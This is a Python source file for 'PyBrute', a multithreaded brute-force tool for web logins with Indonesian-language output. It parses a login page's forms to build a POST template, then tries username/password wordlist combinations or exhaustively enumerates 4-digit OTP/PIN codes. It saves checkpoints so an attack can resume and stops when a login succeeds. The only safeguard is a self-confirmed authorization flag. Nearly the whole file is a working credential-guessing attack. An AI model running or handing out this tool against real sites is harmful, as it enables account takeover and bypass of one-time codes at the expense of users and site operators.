import requests
from bs4 import BeautifulSoup
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, parse_qsl
import threading
import time
import sys
import os
import json
import signal

LOCK = threading.Lock()
STOP_EVENT = threading.Event()
CHECKPOINT_FILE = '.pybrute_checkpoint'

# Global settings for output mode
OUTPUT_MODE = 'normal'  # 'silent', 'normal', 'verbose'

def log_output(message, level='normal'):
    """
    Wrapper function for output based on mode.
    level: 'silent', 'normal', 'verbose'
    """
    global OUTPUT_MODE
    if OUTPUT_MODE == 'silent' and level == 'normal':
        return  # Don't print normal messages in silent mode
    if OUTPUT_MODE != 'verbose' and level == 'verbose':
        return  # Don't print verbose messages unless in verbose mode
    print(message)


def print_banner():
    banner = r"""
██████╗ ██╗   ██╗██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██║   ██║██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██║   ██║██████╔╝██║   ██║   ██║   █████╗  
██╔═══╝ ██║   ██║██╔═══╝ ██║   ██║   ██║   ██╔══╝  
██║     ╚██████╔╝██║     ╚██████╔╝   ██║   ███████╗
╚═╝      ╚═════╝ ╚═╝      ╚═════╝    ╚═╝   ╚══════╝
         PyBrute Login - Brute Force & Analyzer
    """
    log_output(banner, level='normal')


def generate_otp_list(length=4):
    """
    Generate OTP list from 0000 to 9999 (or based on length).
    
    Args:
        length: Number of digits in OTP (default: 4)
    
    Returns:
        List of OTP strings
    """
    max_value = 10 ** length
    return [str(i).zfill(length) for i in range(max_value)]


def analyze_post_params(url, timeout=10):
    try:
        resp = requests.get(url, timeout=timeout)
    except requests.RequestException as e:
        log_output(f"[-] Tidak dapat mengakses URL {url}. Error: {e}", level='normal')
        return

    if resp.status_code != 200:
        log_output(f"[-] Tidak dapat mengakses URL {url}. Status code: {resp.status_code}", level='normal')
        return

    soup = BeautifulSoup(resp.text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        log_output("[!] Tidak ditemukan form di halaman ini.", level='normal')
        return

    username_candidates = ['user', 'username', 'email', 'login', 'log', 'usr']
    password_candidates = ['pass', 'password', 'pwd']
    otp_candidates = ['otp', 'code', 'token', 'pin']  # OTP field detection

    otp_detected = False

    for i, form in enumerate(forms, start=1):
        log_output(f"\n[+] Form #{i}", level='normal')
        method = form.get('method', 'GET').upper()
        action = form.get('action') or url
        action = urljoin(url, action)
        log_output(f"    Method: {method}", level='normal')
        log_output(f"    Action: {action}", level='normal')

        inputs = form.find_all('input')
        if not inputs:
            log_output("    Tidak ditemukan input field.", level='normal')
            continue

        log_output("    Input Fields:", level='normal')
        post_data = []
        for input_field in inputs:
            name = input_field.get('name') or '(tidak ada nama)'
            input_type = input_field.get('type', 'text')
            value = input_field.get('value', '')
            placeholder = input_field.get('placeholder', '')
            log_output(f"        - Name: {name}, Type: {input_type}, Value: {value}, Placeholder: {placeholder}", level='normal')

            if name == '(tidak ada nama)':
                continue

            lname = name.lower()
            
            # Check for OTP fields
            if any(c in lname for c in otp_candidates):
                otp_detected = True
                post_data.append(f"{name}=$pass")
            elif any(c in lname for c in username_candidates):
                post_data.append(f"{name}=$user")
            elif any(c in lname for c in password_candidates):
                post_data.append(f"{name}=$pass")
            else:
                post_data.append(f"{name}={value}")

        if method == 'POST':
            post_string = "&".join(post_data)
            log_output(f"\n    [!] Format POST data untuk brute force:", level='normal')
            log_output(f"    --post \"{post_string}\"", level='normal')
            
            # Suggest OTP mode if OTP field detected
            if otp_detected:
                log_output(f"\n    [!] Terdeteksi field OTP/PIN/Code!", level='normal')
                log_output(f"    [!] Gunakan flag --otp-mode untuk auto-generate kombinasi", level='normal')
                log_output(f"    Contoh: --otp-mode --otp-length 4", level='normal')


def build_data_from_template(template, username, password):
    # template expected like: "field1=value1&userfield=$user&passfield=$pass"
    # parse into list of pairs then replace
    pairs = parse_qsl(template, keep_blank_values=True)
    data = {}
    for k, v in pairs:
        v2 = v.replace('$user', username).replace('$pass', password)
        data[k] = v2
    return data


def is_success_response(resp, success_string=None):
    """
    Check if response indicates successful login.
    Priority: custom success_string > status code detection > redirect
    
    Args:
        resp: Response object
        success_string: Custom success indicator string
    
    Returns:
        Boolean indicating success
    
    Note:
        The status code 200 heuristic (checking for error keywords) may produce
        false positives. For reliable detection, always provide a custom success_string
        that uniquely identifies successful authentication (e.g., "Welcome", "Dashboard").
    """
    # Priority 1: Custom success string
    if success_string:
        try:
            if success_string in resp.text:
                return True
        except Exception:
            pass
    
    # Priority 2: Status code detection (heuristic - may have false positives)
    if resp.status_code == 200:
        # Check for common error indicators
        error_keywords = ['error', 'invalid', 'wrong', 'incorrect', 'failed', 'gagal']
        text_lower = resp.text.lower()
        has_error = any(keyword in text_lower for keyword in error_keywords)
        
        if not has_error and not success_string:
            # Likely success if 200 and no error keywords (heuristic)
            return True
    
    # Priority 3: Redirect detection (301/302)
    if resp.status_code in [301, 302] or resp.history:
        return True
    
    return False


def brute_force_attempt(session, url, username, password, post_template, success_response, attempt_number, total_attempts, timeout=10):
    # Check if stop event is set
    if STOP_EVENT.is_set():
        return False
    
    try:
        data = build_data_from_template(post_template, username, password)
    except Exception as e:
        with LOCK:
            log_output(f"[!] Gagal membangun data POST untuk {username}:{password} - {e}", level='normal')
        return False

    try:
        resp = session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        with LOCK:
            log_output(f"[-] Request error untuk {username} - {e}", level='normal')
        return False

    progress = (attempt_number / total_attempts) * 100 if total_attempts else 0
    # Mask password in output
    masked = '***'
    with LOCK:
        log_output(f"Progres: {progress:.2f}% - Mencoba: {username}:{masked}", level='normal')
        
        # Verbose mode: show response headers and status
        if OUTPUT_MODE == 'verbose':
            log_output(f"  Status Code: {resp.status_code}", level='verbose')
            log_output(f"  Headers: {dict(resp.headers)}", level='verbose')

    # Check success using the new function
    if is_success_response(resp, success_response):
        with LOCK:
            log_output(f"[+] Login berhasil: {username}:{password}", level='silent')  # Always show success
        return True

    return False


def save_checkpoint(index, total, username, password):
    """Save checkpoint for resume functionality."""
    checkpoint_data = {
        'current_index': index,
        'total_attempts': total,
        'last_tried': f"{username}:{password}"
    }
    try:
        with open(CHECKPOINT_FILE, 'w') as f:
            json.dump(checkpoint_data, f)
    except Exception as e:
        log_output(f"[!] Gagal menyimpan checkpoint: {e}", level='normal')


def load_checkpoint():
    """Load checkpoint if exists."""
    if not os.path.exists(CHECKPOINT_FILE):
        return None
    
    try:
        with open(CHECKPOINT_FILE, 'r') as f:
            checkpoint_data = json.load(f)
        return checkpoint_data
    except Exception as e:
        log_output(f"[!] Gagal membaca checkpoint: {e}", level='normal')
        return None


def brute_force_threading(url, username_file, password_file, post_template, success_response, threads=5, timeout=10, delay=0.0, resume=False, otp_mode=False, otp_length=4):
    # Handle OTP mode
    if otp_mode:
        log_output(f"[+] Mode OTP aktif - Generate OTP {otp_length} digit", level='normal')
        passwords = generate_otp_list(otp_length)
        users = ['otp_user']  # Placeholder username for OTP mode
    else:
        # Read username and password lists
        if not username_file or not password_file:
            log_output('[!] Username file dan password file diperlukan untuk mode normal.', level='normal')
            return
        with open(username_file, 'r', encoding='utf-8') as f:
            users = [l.strip() for l in f if l.strip()]
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [l.strip() for l in f if l.strip()]

    total_attempts = len(users) * len(passwords)
    if total_attempts == 0:
        log_output('[!] Tidak ada kombinasi username/password untuk dicoba.', level='normal')
        return

    # Load checkpoint if resume mode
    start_index = 0
    if resume:
        checkpoint = load_checkpoint()
        if checkpoint:
            start_index = checkpoint.get('current_index', 0)
            log_output(f"[+] Resume dari checkpoint: {checkpoint.get('last_tried', 'N/A')}", level='normal')
            log_output(f"[+] Melanjutkan dari percobaan #{start_index}/{total_attempts}", level='normal')

    session = requests.Session()
    attempt_counter = 0
    success_found = False

    # Setup signal handler for Ctrl+C
    def signal_handler(sig, frame):
        log_output('\n[!] Ctrl+C terdeteksi - Menyimpan checkpoint...', level='silent')
        if attempt_counter > 0 and len(users) > 0 and len(passwords) > 0:
            # Save current state with bounds checking
            user_idx = (attempt_counter - 1) // len(passwords) % len(users)
            pass_idx = (attempt_counter - 1) % len(passwords)
            current_user = users[user_idx] if user_idx < len(users) else users[0]
            current_pass = passwords[pass_idx] if pass_idx < len(passwords) else passwords[0]
            save_checkpoint(attempt_counter, total_attempts, current_user, current_pass)
            log_output(f'[+] Checkpoint tersimpan. Gunakan --resume untuk melanjutkan.', level='silent')
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)

    with ThreadPoolExecutor(max_workers=threads) as exc:
        futures = {}
        for u in users:
            for p in passwords:
                attempt_counter += 1
                
                # Skip if before checkpoint
                if attempt_counter <= start_index:
                    continue
                
                future = exc.submit(brute_force_attempt, session, url, u, p, post_template, success_response, attempt_counter, total_attempts, timeout)
                futures[future] = (u, p, attempt_counter)
                
                if delay:
                    time.sleep(delay)

        # Wait for results and cancel remaining on success
        for future in as_completed(futures):
            try:
                res = future.result()
                u, p, idx = futures[future]
                
                if res:
                    success_found = True
                    log_output('[+] Berhasil ditemukan, menghentikan brute force...', level='silent')
                    
                    # Set stop event to signal other threads
                    STOP_EVENT.set()
                    
                    # Cancel remaining futures
                    for f in futures:
                        if not f.done():
                            f.cancel()
                    
                    break
                
                # Save checkpoint every 100 attempts
                if idx % 100 == 0:
                    save_checkpoint(idx, total_attempts, u, p)
                    
            except Exception as e:
                with LOCK:
                    log_output(f"[!] Exception in worker: {e}", level='normal')

    if not success_found:
        log_output('[*] Tidak ditemukan kombinasi yang berhasil.', level='silent')
    
    # Clean up checkpoint file on completion
    if os.path.exists(CHECKPOINT_FILE) and success_found:
        try:
            os.remove(CHECKPOINT_FILE)
        except Exception:
            pass


def main():
    global OUTPUT_MODE
    
    parser = argparse.ArgumentParser(description='PyBrute - Brute Force & Analyzer (for authorized testing only)')
    parser.add_argument('--url', help='Target URL (login page)', required=True)
    parser.add_argument('--analyze', action='store_true', help='Analyze forms on the page and show POST template')
    parser.add_argument('--post', help='POST template string, use $user and $pass for placeholders')
    parser.add_argument('--userlist', help='File with usernames (one per line)')
    parser.add_argument('--passlist', help='File with passwords (one per line)')
    parser.add_argument('--otp-mode', action='store_true', help='OTP mode - auto-generate OTP combinations')
    parser.add_argument('--otp-length', type=int, default=4, help='OTP length in digits (default: 4)')
    parser.add_argument('--success', help='String that indicates successful login (optional)')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--delay', type=float, default=0.0, help='Delay between task submissions (seconds)')
    parser.add_argument('--silent', action='store_true', help='Silent mode - only show success results')
    parser.add_argument('--verbose', action='store_true', help='Verbose mode - show detailed request info')
    parser.add_argument('--resume', action='store_true', help='Resume from last checkpoint')
    parser.add_argument('--confirm-authorized', action='store_true', help='You must confirm you have authorization to test this target')

    args = parser.parse_args()

    # Set output mode
    if args.silent:
        OUTPUT_MODE = 'silent'
    elif args.verbose:
        OUTPUT_MODE = 'verbose'
    else:
        OUTPUT_MODE = 'normal'

    print_banner()

    if args.analyze:
        analyze_post_params(args.url, timeout=args.timeout)
        sys.exit(0)

    # Brute-force path
    if not args.confirm_authorized:
        log_output('[!] Anda harus menjalankan dengan flag --confirm-authorized untuk memastikan Anda memiliki izin.', level='silent')
        sys.exit(1)

    if not args.post:
        log_output('[!] Untuk mode brute-force, --post wajib.', level='silent')
        sys.exit(1)

    # Validate arguments based on mode
    if args.otp_mode:
        # OTP mode - no userlist/passlist needed
        log_output(f'[+] Mode OTP aktif - akan generate {10**args.otp_length} kombinasi OTP', level='normal')
    else:
        # Normal mode - require userlist and passlist
        if not args.userlist or not args.passlist:
            log_output('[!] Untuk mode normal, --userlist dan --passlist wajib.', level='silent')
            log_output('[!] Atau gunakan --otp-mode untuk mode OTP.', level='silent')
            sys.exit(1)

    # Resolve action URL if post template provides a different action (expectation: user supplies correct URL)
    target_url = args.url

    brute_force_threading(
        target_url, 
        args.userlist, 
        args.passlist, 
        args.post, 
        args.success or '', 
        threads=args.threads, 
        timeout=args.timeout, 
        delay=args.delay,
        resume=args.resume,
        otp_mode=args.otp_mode,
        otp_length=args.otp_length
    )


if __name__ == '__main__':
    main()
